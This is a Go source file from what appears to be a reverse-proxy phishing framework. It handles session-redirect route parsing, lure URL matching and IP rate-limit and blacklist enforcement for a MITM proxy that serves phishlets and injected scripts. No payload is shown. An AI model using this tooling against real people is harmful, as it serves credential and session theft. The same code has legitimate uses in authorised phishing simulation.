package core

import (
	"net/http"
	"regexp"
	"strings"

	"github.com/elazarl/goproxy"
	"github.com/s4l1hs/olta/pkg/proxy/log"
	"github.com/s4l1hs/olta/pkg/proxy/middleware/asncloak"
)

// Request pipeline steps
//
// These are extractions from the goproxy OnRequest closure in
// NewHttpProxy, following what f22e35b did for the response side. The
// closure cannot be invoked without a live MITM listener, so every decision
// it made was unreachable from a unit test; a step pulled out here takes
// explicit inputs and returns an explicit result, and the closure calls
// straight through to it with its control flow unchanged.

var (
	// sessionRoutePattern matches the proxy's own /s/<session> route, and
	// sessionScriptRoutePattern its /s/<session>/<script>.js form.
	//
	// Both were compiled with regexp.MustCompile *inside* the per-request
	// closure, so every single proxied request -- every image, every script,
	// every XHR -- paid for two regex compilations before anything else
	// happened. They are compiled once here for the same reason
	// compileSubFilterRegex exists on the response side.
	sessionRoutePattern       = regexp.MustCompile(`^/s/([^/]*)`)
	sessionScriptRoutePattern = regexp.MustCompile(`^/s/([^/]*)/([^/]*)`)
)

// SessionRoute is a parsed /s/<session> request.
type SessionRoute struct {
	SessionID string
	// IsScript is true for /s/<session>.js, which serves the dynamic
	// redirect script, as opposed to /s/<session>, which is the JSON API the
	// script polls.
	IsScript bool
}

// SessionScriptRoute is a parsed /s/<session>/<script>.js request.
type SessionScriptRoute struct {
	SessionID string
	// ScriptID is empty when the second path segment is not a "<name>.js".
	// The ".js" suffix is required to serve a script: treating
	// /s/<session>/<anything> as a script route would expose a phishlet's
	// injected script under an arbitrary path.
	ScriptID string
}

// parseSessionScriptRoute reports whether path has the /s/<a>/<b> shape.
//
// It reports a match on the *shape*, not on whether a script can be served,
// because matching the two-segment shape shadows the single-segment route
// even when <b> is not a script. That is the original behavior and it is
// preserved deliberately: /s/<session>/notjs must fall through to ordinary
// proxying, not be handled as the /s/<session> redirect API.
func parseSessionScriptRoute(path string) (SessionScriptRoute, bool) {
	match := sessionScriptRoutePattern.FindStringSubmatch(path)
	if len(match) < 3 {
		return SessionScriptRoute{}, false
	}
	scriptID, _ := trimJSSuffix(match[2])
	if !strings.HasSuffix(match[2], ".js") || len(match[2]) == 3 {
		scriptID = ""
	}
	return SessionScriptRoute{SessionID: match[1], ScriptID: scriptID}, true
}

// parseSessionRoute matches the dynamic-redirect route in both its forms.
func parseSessionRoute(path string) (SessionRoute, bool) {
	match := sessionRoutePattern.FindStringSubmatch(path)
	if len(match) < 2 {
		return SessionRoute{}, false
	}
	if sessionID, ok := trimJSSuffix(match[1]); ok {
		return SessionRoute{SessionID: sessionID, IsScript: true}, true
	}
	return SessionRoute{SessionID: match[1]}, true
}

// trimJSSuffix strips a ".js" suffix, reporting whether there was one. A bare
// ".js" is not a script name, so it does not count.
func trimJSSuffix(value string) (string, bool) {
	if !strings.HasSuffix(value, ".js") || len(value) == 3 {
		return value, false
	}
	return value[:len(value)-3], true
}

// RequestTargets are the URL forms the request pipeline works from.
type RequestTargets struct {
	// URL is the full request URL including the query string.
	URL string
	// Host is the request's Host header.
	Host string
	// LureURL is the request URL *without* the query string, which is what a
	// lure path is matched against -- a lure is identified by its path, and
	// including the query would mean a tracking parameter appended to the
	// link stopped it matching.
	LureURL string
	// Path is the request path, with no query string.
	Path string
}

// resolveRequestTargets derives the URL forms the rest of the pipeline uses.
func resolveRequestTargets(req *http.Request) RequestTargets {
	if req == nil || req.URL == nil {
		return RequestTargets{}
	}
	base := req.URL.Scheme + "://" + req.Host + req.URL.Path
	targets := RequestTargets{
		URL:     base,
		Host:    req.Host,
		LureURL: base,
		Path:    req.URL.Path,
	}
	if req.URL.RawQuery != "" {
		targets.URL += "?" + req.URL.RawQuery
	}
	return targets
}

// enforceAccessControls applies the per-IP rate limit and the IP blacklist,
// in that order, returning a response when the request must not proceed.
//
// It runs before anything else in the request path, so it is the one place
// that decides whether a client is served at all. Extracting it makes that
// decision testable: previously the only way to exercise a blacklist-mode
// transition was to stand up a live MITM listener.
//
// The client address is resolved through asncloak.ResolveClientIP, which
// honors proxy headers only when trustProxyHeaders is explicitly enabled.
// Trusting them unconditionally lets any client spoof past rate limiting and
// blacklisting, and under blacklist_mode=all lets it poison the persistent
// blacklist with an address of its choosing.
func (p *HttpProxy) enforceAccessControls(req *http.Request) (string, *http.Response) {
	fromIP := asncloak.ResolveClientIP(req, p.trustProxyHeaders)

	if allowed, err := p.db.AllowRequest(fromIP, p.rateLimit, p.rateWindow); err != nil {
		log.Error("rate limit: %v", err)
	} else if !allowed {
		log.Warning("rate limit: request from ip address '%s' was throttled", fromIP)
		return fromIP, goproxy.NewResponse(req, "text/plain", http.StatusTooManyRequests, "Too Many Requests")
	}

	if p.cfg.GetBlacklistMode() == "off" {
		return fromIP, nil
	}

	if p.bl.IsBlacklisted(fromIP) {
		if p.bl.IsVerbose() {
			log.Warning("blacklist: request from ip address '%s' was blocked", fromIP)
		}
		_, response := p.blockRequest(req)
		return fromIP, response
	}

	if p.cfg.GetBlacklistMode() == "all" {
		// blacklist_mode=all blocks everything that is not explicitly
		// whitelisted, and records the address so the block survives a
		// restart.
		if !p.bl.IsWhitelisted(fromIP) {
			err := p.bl.AddIP(fromIP)
			if p.bl.IsVerbose() {
				if err != nil {
					log.Error("blacklist: %s", err)
				} else {
					log.Warning("blacklisted ip address: %s", fromIP)
				}
			}
		}
		_, response := p.blockRequest(req)
		return fromIP, response
	}

	return fromIP, nil
}
